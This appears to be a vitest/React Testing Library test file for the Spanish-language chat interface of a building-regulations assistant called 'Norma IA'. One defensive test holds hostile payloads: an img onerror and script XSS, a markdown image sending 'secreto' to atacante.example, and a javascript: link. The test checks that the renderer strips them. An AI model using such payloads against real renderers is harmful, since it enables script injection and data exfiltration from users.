import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { beforeAll, describe, expect, it, vi } from 'vitest';
import { AppError } from '@/application/errors';
import type { EventoChat } from '@/domain/chat/chat';
import { CONTEXTO, fakeDeps, renderApp, respuesta } from '@/ui/test/renderApp';
import { Markdown } from './Markdown';

beforeAll(() => {
  // jsdom no implementa <dialog> ni IntersectionObserver
  HTMLDialogElement.prototype.showModal ??= function (this: HTMLDialogElement) {
    this.setAttribute('open', '');
  };
  HTMLDialogElement.prototype.close ??= function (this: HTMLDialogElement) {
    this.removeAttribute('open');
  };
  globalThis.IntersectionObserver ??= class {
    observe() {}
    disconnect() {}
    unobserve() {}
    takeRecords() {
      return [];
    }
    root = null;
    rootMargin = '';
    thresholds = [];
  } as unknown as typeof IntersectionObserver;
});

function logueado() {
  const deps = fakeDeps();
  deps.auth.haySesion.mockReturnValue(true);
  return deps;
}

describe('chat del usuario final', () => {
  it('bienvenida con el nombre y el historial del área', async () => {
    renderApp('/app', logueado());
    expect(await screen.findByRole('heading', { name: /Hola, Ana\./ })).toBeInTheDocument();
    const side = screen.getByRole('complementary', { name: 'Conversaciones' });
    expect(await within(side).findByRole('button', { name: 'Salidas de evacuación' })).toBeInTheDocument();
    expect(within(side).getByRole('button', { name: 'Consulta #12' })).toBeInTheDocument(); // sin título → fallback
    expect(screen.getByText('NORMA · GENERAL')).toBeInTheDocument();
  });

  it('una sugerencia inicia el streaming; el texto acumulado no se duplica y el chat nuevo aparece en el historial', async () => {
    const user = userEvent.setup();
    const deps = logueado();
    renderApp('/app', deps);
    await user.click(await screen.findByRole('button', { name: /salidas de evacuación necesita/i }));
    expect(deps.chat.consultar).toHaveBeenCalledWith(expect.objectContaining({ chatId: null, contexto: CONTEXTO, archivos: [] }), expect.any(AbortSignal));
    const resp = await screen.findByRole('article', { name: 'Respuesta de Norma IA' });
    await waitFor(() => expect(resp).toHaveTextContent('Según la A.130, se requieren 2 salidas.'));
    expect(resp.textContent?.match(/Según/g)).toHaveLength(1);
    expect(within(resp).getByText('A.130')).toHaveClass('norma-code');
    // El chat creado se selecciona y aparece en el historial
    const side = screen.getByRole('complementary', { name: 'Conversaciones' });
    await waitFor(() => expect(within(side).getByRole('button', { name: 'Nueva' }).closest('li')).toHaveAttribute('aria-current', 'true'));
    expect(screen.getByRole('button', { name: 'Copiar respuesta' })).toBeInTheDocument();
  });

  it('Enter envía, Shift+Enter hace salto de línea y vacío no envía', async () => {
    const user = userEvent.setup();
    const deps = logueado();
    renderApp('/app', deps);
    const input = await screen.findByLabelText('Escribe tu consulta');
    await user.type(input, '   {Enter}');
    expect(deps.chat.consultar).not.toHaveBeenCalled();
    await user.clear(input);
    await user.type(input, 'Línea 1{Shift>}{Enter}{/Shift}Línea 2');
    expect(input).toHaveValue('Línea 1\nLínea 2');
    await user.keyboard('{Enter}');
    expect(deps.chat.consultar).toHaveBeenCalledWith(expect.objectContaining({ texto: 'Línea 1\nLínea 2' }), expect.any(AbortSignal));
  });

  it('abre una consulta del historial y carga sus mensajes', async () => {
    const user = userEvent.setup();
    const deps = logueado();
    renderApp('/app', deps);
    await user.click(await screen.findByRole('button', { name: 'Salidas de evacuación' }));
    expect(await screen.findByText('¿Cuántas salidas?')).toBeInTheDocument();
    expect(deps.chat.mensajes).toHaveBeenCalledWith(11, CONTEXTO, null);
    expect(screen.getByRole('heading', { level: 1, name: 'Salidas de evacuación' })).toBeInTheDocument();
  });

  it('renombrar en línea (Enter) y eliminar con confirmación', async () => {
    const user = userEvent.setup();
    const deps = logueado();
    renderApp('/app', deps);
    await user.click(await screen.findByRole('button', { name: 'Opciones de “Salidas de evacuación”' }));
    await user.click(screen.getByRole('menuitem', { name: 'Renombrar' }));
    const input = screen.getByLabelText('Nuevo título de la consulta');
    await user.clear(input);
    await user.type(input, 'Evacuación mall{Enter}');
    expect(deps.chat.renombrar).toHaveBeenCalledOnce();
    expect(deps.chat.renombrar).toHaveBeenCalledWith(11, 'Evacuación mall');
    expect(await screen.findByRole('button', { name: 'Evacuación mall' })).toBeInTheDocument();

    await user.click(screen.getByRole('button', { name: 'Opciones de “Evacuación mall”' }));
    await user.click(screen.getByRole('menuitem', { name: 'Eliminar' }));
    const dialog = screen.getByRole('dialog', { name: '¿Eliminar esta consulta?' });
    expect(within(dialog).getByRole('button', { name: 'Cancelar' })).toHaveFocus();
    await user.click(within(dialog).getByRole('button', { name: 'Eliminar' }));
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Evacuación mall' })).not.toBeInTheDocument());
    expect(deps.chat.eliminar).toHaveBeenCalledWith(11);
  });

  it('Detener conserva lo recibido', async () => {
    const user = userEvent.setup();
    const deps = logueado();
    deps.chat.consultar.mockImplementation(async function* (_i, signal): AsyncGenerator<EventoChat> {
      yield { tipo: 'chat-asignado', chatId: 50 };
      yield { tipo: 'inicio-respuesta', creadoEn: 1 };
      yield { tipo: 'texto', contenido: 'Respuesta parcial' };
      await new Promise((_, rej) => signal.addEventListener('abort', () => rej(new AppError('aborted', 0, 't'))));
    });
    renderApp('/app', deps);
    await user.type(await screen.findByLabelText('Escribe tu consulta'), 'Pregunta{Enter}');
    await user.click(await screen.findByRole('button', { name: 'Detener' }));
    expect(await screen.findByText('Respuesta detenida.')).toBeInTheDocument();
    expect(screen.getByText('Respuesta parcial')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Enviar consulta' })).toBeInTheDocument();
  });

  it('error del servidor: mensaje propio y reintento con la misma consulta', async () => {
    const user = userEvent.setup();
    const deps = logueado();
    deps.chat.consultar
      .mockImplementationOnce(async function* (): AsyncGenerator<EventoChat> {
        yield { tipo: 'progreso', texto: 'Buscando…' };
        throw new AppError('server', 500, 'r', 'SP_ERROR');
      })
      .mockImplementationOnce(() => respuesta('Ahora sí.'));
    renderApp('/app', deps);
    await user.type(await screen.findByLabelText('Escribe tu consulta'), 'Pregunta X{Enter}');
    expect(await screen.findByText('No pudimos completar la respuesta. Inténtalo de nuevo.')).toBeInTheDocument();
    expect(screen.queryByText(/SP_ERROR/)).not.toBeInTheDocument();
    await user.click(screen.getByRole('button', { name: 'Reintentar' }));
    expect(await screen.findByText('Ahora sí.')).toBeInTheDocument();
    expect(deps.chat.consultar).toHaveBeenLastCalledWith(expect.objectContaining({ texto: 'Pregunta X' }), expect.any(AbortSignal));
  });

  it('cerrar sesión limpia y vuelve al ingreso', async () => {
    const user = userEvent.setup();
    const deps = logueado();
    const { router } = renderApp('/app', deps);
    await user.click(await screen.findByRole('button', { name: /menú de cuenta/ }));
    await user.click(screen.getByRole('button', { name: 'Cerrar sesión' }));
    await waitFor(() => expect(router.state.location.pathname).toBe('/ingresar'));
    expect(deps.chat.cerrarSesion).toHaveBeenCalledOnce();
    expect(await screen.findByRole('status')).toHaveTextContent('Cerraste sesión correctamente.');
  });

  it('usuario sin área asignada: estado claro, sin chat', async () => {
    const deps = logueado();
    deps.chat.contextos.mockResolvedValue([]);
    renderApp('/app', deps);
    expect(await screen.findByRole('heading', { name: 'Tu cuenta aún no tiene un área de consulta' })).toBeInTheDocument();
    expect(screen.queryByLabelText('Escribe tu consulta')).not.toBeInTheDocument();
  });
});

describe('render seguro de respuestas (texto del modelo = no confiable)', () => {
  it('no ejecuta HTML, bloquea imágenes y enlaces peligrosos', () => {
    const { container } = render(
      <Markdown
        text={[
          '<img src=x onerror="alert(1)"><script>alert(2)</script>',
          '![exfil](https://atacante.example/p?d=secreto)',
          '[clic](javascript:alert(3)) [ok](https://www.gob.pe/vivienda)',
        ].join('\n\n')}
      />,
    );
    expect(container.querySelector('script, img, [onerror]')).toBeNull();
    expect(container.querySelector('[src*="atacante"], [href*="atacante"]')).toBeNull();
    expect(container.querySelector('a[href^="javascript"]')).toBeNull();
    const ok = screen.getByRole('link', { name: 'ok' });
    expect(ok).toHaveAttribute('rel', 'noopener noreferrer nofollow');
    expect(ok).toHaveAttribute('target', '_blank');
  });

  it('tablas con scroll horizontal accesible', () => {
    render(<Markdown text={'| Aforo | Salidas |\n| --- | --- |\n| 500 | 2 |'} />);
    expect(screen.getByRole('region', { name: 'Tabla' })).toContainElement(screen.getByRole('table'));
  });
});

describe('adjuntos en el compositor', () => {
  it('rechaza archivos que no son imagen y acepta PNG real', async () => {
    const user = userEvent.setup({ applyAccept: false });
    renderApp('/app', logueado());
    await screen.findByLabelText('Escribe tu consulta');
    const input = document.querySelector<HTMLInputElement>('input[type="file"]')!;
    await user.upload(input, new File(['%PDF'], 'norma.pdf', { type: 'application/pdf' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('Solo se aceptan imágenes PNG, JPG o WEBP.');
    vi.stubGlobal('URL', Object.assign(URL, { createObjectURL: () => 'blob:x', revokeObjectURL: () => {} }));
    await user.upload(input, new File([new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0])], 'plano.png', { type: 'image/png' }));
    expect(await screen.findByRole('img', { name: 'Adjunto 1: plano.png' })).toBeInTheDocument();
    vi.unstubAllGlobals();
  });
});
